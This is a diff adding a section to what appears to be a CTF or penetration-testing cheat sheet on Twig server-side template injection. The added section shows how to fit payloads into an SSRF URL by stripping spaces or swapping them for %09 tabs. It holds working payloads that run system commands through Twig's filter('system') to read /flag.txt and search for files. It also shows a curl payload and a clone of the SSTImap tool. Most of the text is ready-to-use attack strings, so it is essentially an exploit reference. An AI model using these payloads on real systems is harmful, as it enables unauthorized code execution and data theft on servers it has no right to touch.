@@ -157,6 +157,25 @@ curl -s -G "http://<TARGET>/" \
   --data-urlencode "param={{ ['cat /flag.txt'] | filter('system') }}"
 ```
 
+### Twig via SSRF — Space Problem
+When a Twig payload is embedded inside a URL (e.g. SSRF routes to an internal API with SSTI), spaces in the payload break URL parsing. Two fixes:
+
+1. **Remove all spaces from Twig syntax:**
+```bash
+# BROKEN — spaces cause URL parsing failure
+api=http://internal/?id={{ ['id'] | filter('system') }}
+
+# FIXED — no spaces in Twig syntax
+api=http://internal/?id={{['id']|filter('system')}}
+```
+
+2. **Use `%09` (tab) instead of spaces inside the command string:**
+```bash
+# Commands with spaces — use %09 as separator
+{{['find%09/%09-name%09flag*%092>/dev/null']|filter('system')}}
+{{['cat%09/flag.txt']|filter('system')}}
+```
+
 ### Phase 4 — SSTImap (automated)
 ```bash
 git clone https://github.com/vladko312/SSTImap
